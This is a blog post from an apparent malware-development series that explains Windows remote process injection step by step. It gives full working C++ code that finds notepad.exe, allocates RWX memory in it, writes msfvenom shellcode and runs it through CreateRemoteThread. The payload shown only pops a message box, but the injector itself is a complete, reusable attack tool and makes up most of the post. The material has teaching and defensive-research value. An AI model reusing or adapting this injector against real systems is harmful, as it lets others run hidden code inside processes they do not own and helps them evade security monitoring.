---
title: "Remote process injection: Executing shellocode in a remote process. "
date: 2025-07-16 22:45:30 +0200
categories: [Maldev, Process Injection]
tags: [Process Injection, Maldev, Windows, User-Mode]     # TAG names should always be lowercase
image: assets/RemoteProcessInjection/wallhaven-e792jk.jpg
---


## **Overview**

In today's series, we'll explore how to inject a shellcode into a remote process using classic Windows APIs such as `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread`. However, this technique is currently heavily monitored by security vendors such as AV/EDR. Nevertheless, understanding how remote process injection works can serve as a good basis for grasping how cutting-edge real-life malware operates. So let's dive in!

## **Execution flow**

- #### **Crafting a custom function to retrieve the remote process ID:** ####
  We craft a function that returns the remote process ID, where `GetRemoteProcessID` takes a reference to a `std::wstring` variable as a parameter to perform a case-sensitive string comparison for the target process.

{% highlight CPP%}
DWORD GetRemoteProcessID(const std::wstring& processName)
{ 
    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    auto hSnapshot { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
    if(hSnapshot == INVALID_HANDLE_VALUE)
    {
        CloseHandle(hSnapshot);
        return 0;
    } 
    else if(Process32FirstW(hSnapshot, &pe32))
    {
        //If processName is equal to pe32.szExeFile, close handle and return the process ID to the caller.
        while(Process32NextW(hSnapshot, &pe32))
        {
            if(processName == pe32.szExeFile)
            {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }  
        }
    }
    
    CloseHandle(hSnapshot);
    return 0;
}
{% endhighlight %}

  - **pe32:** We declare and define a variable of type `PROCESSENTRY32W`, which stores information about processes such as `PID`, `TID`, modules, etc. Keep in mind that before calling `Process32FirstW`, ensure that `pe32.dwSize` is set to `sizeof(PROCESSENTRY32)`.
  - **CreateToolhelp32Snapshot:** This function is invoked to take a snapshot of all system processes and return a handle.
  
  To walk through the list of processes stored in the snapshot, we call `Process32FirstW` to retrieve the first process and `Process32NextW` to continue traversing the list. If the process name exists in the list, the function close the handle and returns the process ID.

- #### **Crafting another custom function to allocate remote memory:** ####

After identifying the target process in which the shellcode will be injected, the next step is to allocate memory and copy the shellcode into that region, ensuring it has the necessary security memory attributes, such as `RWX`. I'm using a custom function primarily responsible for retrieving a handle to an open process and allocating memory. If the function fails, it returns `FALSE` and cleans up resources, such as allocated memory and open handle objects; otherwise, it returns `TRUE`.

{% highlight CPP %}
BOOL MemoryAllocation(const DWORD dwProcessID, LPVOID* lpBuffer, HANDLE* hProcessHandle, SIZE_T& cbSize)
{

    if(dwProcessID == NULL || cbSize == NULL)
    {
        std::cerr << "[-] Invalid argument!..." << std::endl;
        return FALSE;
    } // Obtain a handle to an open process.
    else if(*hProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID))
    {
        try
        {   // Allocate memory for payload.
            *lpBuffer = VirtualAllocEx(*hProcessHandle, NULL, cbSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if(!(WriteProcessMemory(*hProcessHandle, *lpBuffer, payload, cbSize, NULL)) && *lpBuffer == nullptr) // Copy payload to memory buffer.
            throw FALSE;
        }
        catch(BOOL e)
        {
            if(*lpBuffer)
                VirtualFreeEx(*hProcessHandle, *lpBuffer, cbSize, MEM_RELEASE);
            else if (*hProcessHandle)
                CloseHandle(*hProcessHandle);
                
            return e;
        }
    }

    return TRUE;
}
{% endhighlight %}

Let's break down the `MemoryAllocation` function:

The function takes four parameters:

- **dwProcessID:** This is the PID returned when  we called `GetRemoteProcessID`.
- **lpBuffer:** A pointer to a memory buffer where shellcode will be written.
- **hProcessHandle:** A handle that will store the target process.
- **cbSize:** A reference to the size of shellcode in bytes.

Within `MemoryAllocation`, we perform several checks and handle exceptions using a `try-catch` block, ensuring proper resource cleanup.

- **penProcess:** It is used to get a handle of a local process.
- **VirtualAllocEx:** This is akin to `VirtualAlloc`, but with enhanced capabilities, as it allows for the allocation of virtual memory in remote processes. This makes it a more powerful function. In this case, we'll allocate memory with read, write, and execute permissions (RWX).
- **WriteProcessMemory:** We use it to copy and inject arbitrary code (shellcode) into the allocated memory region.

#### **Calling a thread and executing shellcode:** ####

The final two stages of the execution flow consist of calling the `CreateRemoteThread` function and executing the shellcode within a newly spawned thread, utilizing `WaitForSingleObject` to ensure proper synchronization.


{% highlight CPP %}
 if(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBuffer, nullptr, 0, &dwThreadID))
        {
            std::cout << "[+] Create remote thread in target process: 0x" << hThread << " PID: " << dwThreadID << std::endl;
            WaitForSingleObject(hThread, 500); // Execute shellcode
            CloseHandle(hThread);
        }
{% endhighlight %}

## **Final code:**

{% highlight CPP %}
#include <Windows.h>
#include <tlhelp32.h>
#include <iostream>

//msfvenom -p windows/x64/messagebox TEXT="System_0x04" TITLE='Crate Thread!' -f c 
unsigned char payload[] = {
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
    "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
    "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
    "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
    "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
    "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
    "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
    "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
    "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
    "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
    "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
    "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
    "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
    "\x8d\x8d\x29\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
    "\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
    "\x00\x3e\x4c\x8d\x85\x1a\x01\x00\x00\x48\x31\xc9\x41\xba"
    "\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
    "\x56\xff\xd5\x53\x79\x73\x74\x65\x6d\x5f\x30\x78\x30\x34"
    "\x00\x43\x72\x65\x61\x74\x65\x20\x54\x68\x72\x65\x61\x64"
    "\x21\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00"
};


DWORD GetRemoteProcessID(const std::wstring& processName)
{ 
    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    auto hSnapshot { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
    if(hSnapshot == INVALID_HANDLE_VALUE)
    {
        CloseHandle(hSnapshot);
        return 0;
    } 
    else if(Process32FirstW(hSnapshot, &pe32))
    {
        //If processName is equal to pe32.szExeFile, close handle and return the process ID to the caller.
        while(Process32NextW(hSnapshot, &pe32))
        {
            if(processName == pe32.szExeFile)
            {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }  
        }
    }
    
    CloseHandle(hSnapshot);
    return 0;
}

BOOL MemoryAllocation(const DWORD dwProcessID, LPVOID* lpBuffer, HANDLE* hProcessHandle, SIZE_T& cbSize)
{

    if(dwProcessID == NULL || cbSize == NULL)
    {
        std::cerr << "[-] Invalid argument!..." << std::endl;
        return FALSE;
    } // Obtain a handle to an open process.
    else if(*hProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID))
    {
        try
        {   // Allocate memory for payload.
            *lpBuffer = VirtualAllocEx(*hProcessHandle, NULL, cbSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if(!(WriteProcessMemory(*hProcessHandle, *lpBuffer, payload, cbSize, NULL)) && *lpBuffer == nullptr) // Copy payload to memory buffer.
            throw FALSE;
        }
        catch(BOOL e)
        {
            if(*lpBuffer)
                VirtualFreeEx(*hProcessHandle, *lpBuffer, cbSize, MEM_RELEASE);
            else if (*hProcessHandle)
                CloseHandle(*hProcessHandle);
                
            return e;
        }
    }

    return TRUE;
}


int main()
{
    std::wstring lpProcessName{ L"notepad.exe" }; // GetRemoteHandle function performs a case-sensitive string comparison
    DWORD dwProcessID{ NULL }, dwThreadID;
    HANDLE hProcess{ nullptr }, hThread{ nullptr };
    LPVOID lpBuffer{ nullptr };
    SIZE_T cbSize{ sizeof(payload) };
    
    dwProcessID = GetRemoteProcessID(lpProcessName);
    if(MemoryAllocation(dwProcessID, &lpBuffer, &hProcess, cbSize))
    {
        std::wcout << "[+] Open remote process: " << lpProcessName << " PID: " << dwProcessID << std::endl;
        std::cout << "[+] Process handle" << " 0x" << hProcess << std::endl;
        std::cout << "[+] Allocating memory in target process: 0x" << lpBuffer << std::endl;

        // Obtain a handle for a remote process.
        if(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBuffer, nullptr, 0, &dwThreadID))
        {
            std::cout << "[+] Create remote thread in target process: 0x" << hThread << " PID: " << dwThreadID << std::endl;
            WaitForSingleObject(hThread, 500); // Execute shellcode
            CloseHandle(hThread);

            // Clean up
            VirtualFreeEx(hProcess, lpBuffer, 0, MEM_RELEASE);
            std::wcout << "[+] Released remote memory in target process: " << lpProcessName << std::endl;
        }
        else
        {
            std::cerr << "[-] Failed to create remote thread: CreateRemotetHread() " << GetLastError();
            if(lpBuffer) VirtualFreeEx(hProcess, lpBuffer, 0, MEM_RELEASE);
                CloseHandle(hProcess);

            return 1;
        }

    }
    else
    {
        std::wcerr << "[-] Oops! failed to allocate remote memory in target process: " << lpProcessName << '\t' << hProcess << std::endl;
        if(lpBuffer) VirtualFreeEx(hProcess, lpBuffer, 0, MEM_RELEASE);
            CloseHandle(hProcess);

        return 1;
    }
    
    return 0;
}
{% endhighlight %}

By comparing the program and setting a breakpoint after writing the arbitrary code to the virtual process's address space, specifically in our case, Notepad, we can observe in Process Hacker that the memory page containing the shellcode bytes is assigned RWX permissions.

![img-description](assets/RemoteProcessInjection/remotePorcessInjection.jpg)


![img-description](assets/RemoteProcessInjection/remotePorcessInjection1.jpg)

## **Summary:**

The approach for executing this technique can be summarized in the following steps:

- Identify the target process into which arbitrary code will be injected.
- Obtain a handle to the target process using the `OpenProcess` function.
- Allocate memory with read, write, and execute `(RWX)` permissions using `VirtualAllocEx`, where the shellcode will be executed within the remote process's virtual address space.
- Copy the shellcode into the previously allocated memory buffer by leveraging `WriteProcessMemory`.
- Spawn a new thread within the target process using `CreateRemoteThread`.
- Finally, execute the shellcode in the newly created thread by invoking `WaitForSingleObject`.






















